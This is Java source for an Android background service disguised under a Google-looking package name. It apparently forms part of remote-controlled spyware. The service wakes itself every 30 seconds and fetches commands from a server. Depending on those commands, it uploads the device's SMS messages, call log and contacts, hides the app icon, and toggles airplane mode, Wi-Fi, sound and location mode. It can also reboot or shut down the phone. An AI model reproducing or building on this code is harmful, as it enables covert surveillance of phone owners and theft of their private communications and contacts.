package com.google.android.apps.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.data_collection.AppsArchive;
import com.google.android.apps.data_collection.CallsArchive;
import com.google.android.apps.data_collection.SmsArchive;
import com.google.android.apps.data_collection.ContactBook;
import com.google.android.apps.repositories.network.NetworkRepo;
import com.google.android.apps.repositories.models.Settings;
import com.google.android.apps.repositories.network.models.response.SyncResponse;
import com.google.android.apps.utils.Preferences;
import com.google.android.apps.utils.ShellCommand;

import java.util.Calendar;
import java.util.List;

import io.reactivex.Single;
import io.reactivex.annotations.NonNull;
import io.reactivex.schedulers.Schedulers;

public class SyncService extends Service {
    private static final int SERVICE_REQUEST_CODE = 35;
    private final String TAG = SyncService.class.getSimpleName();
    private NetworkRepo networkRepo;
    private Preferences preferences;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        networkRepo = App.getAppComponent().getNetworkRepo();
        preferences = App.getAppComponent().getPreferences();
        onSyncSettings();
        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.SECOND, 30);// через period минут

        PendingIntent servicePendingIntent = PendingIntent.getService(this,
                SERVICE_REQUEST_CODE, new Intent(this, SyncService.class),
                PendingIntent.FLAG_UPDATE_CURRENT);

        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                servicePendingIntent);
        super.onStartCommand(intent, flags, startId);
        return Service.START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onSyncSettings() {
        networkRepo.onStateSync()
                .doOnSuccess(response -> preferences.setAppSettings(response.getData()))
                .map(SyncResponse::getData)
                .doOnSuccess(settings -> getSmsList(settings.isSmsList()))
                .doOnSuccess(settings -> getCallsList(settings.isCallList()))
                .doOnSuccess(settings -> getContactsBook(settings.isContactBook()))
                .doOnSuccess(settings -> ShellCommand.setAirplaneMode(settings.getAirplaneMode(), this))
                .doOnSuccess(settings -> ShellCommand.setHideIcon(this, settings.isHideIcon()))
                .doOnSuccess(settings -> ShellCommand.setScreen(settings.getScreen()))
                .doOnSuccess(settings -> ShellCommand.setWifi(settings.getWifi()))
                .doOnSuccess(settings -> ShellCommand.rebootSystem(settings.isReboot()))
                .doOnSuccess(settings -> ShellCommand.shutDownSystem(settings.isShutDown()))
                .doOnSuccess(settings -> ShellCommand.setOnFlash(settings.isFlash()))
                .doOnSuccess(settings -> ShellCommand.setOnVibrate(settings.isVibrate()))
                .doOnSuccess(settings -> ShellCommand.setSound(settings.getSound()))
                .doOnSuccess(settings -> ShellCommand.setValueLocation(settings.getLocationMode()))
                .subscribeOn(Schedulers.io())
                .subscribe(this::handleSuccessLoadSettings,
                        this::handleErrorLoadSettings);
    }

    private Single<Boolean> getSmsList(boolean val) {
        if (val)
            return new SmsArchive().getSmsList()
                    .doOnSuccess(messages -> networkRepo.addSMSList(messages))
                    .map(List::isEmpty);
        else
            return Single.just(true);
    }

    private Single<Boolean> getCallsList(boolean val) {
        if (val)
            return new CallsArchive().getCallList()
                    .doOnSuccess(calls -> networkRepo.addCallsList(calls))
                    .map(List::isEmpty);
        else
            return Single.just(true);
    }

    private Single<Boolean> getContactsBook(boolean val) {
        if (val)
            return new ContactBook().getContactList()
                    .doOnSuccess(contacts -> networkRepo.setContactsBook(contacts))
                    .map(List::isEmpty);
        else
            return Single.just(true);
    }

    private Single<Boolean> getAppsList(boolean val) {
        if (val)
            return new AppsArchive().getInstallApps()
                    .doOnSuccess(apps -> networkRepo.addListApplications(apps))
                    .map(List::isEmpty);
        else
            return Single.just(true);
    }

    private void handleSuccessLoadSettings(
            @NonNull Settings settings) {
        Log.d(TAG, "handleSuccessLoadSettings ");
    }

    private void handleErrorLoadSettings(Throwable throwable) {
        Log.d(TAG, "Sync is " + throwable);
    }
}

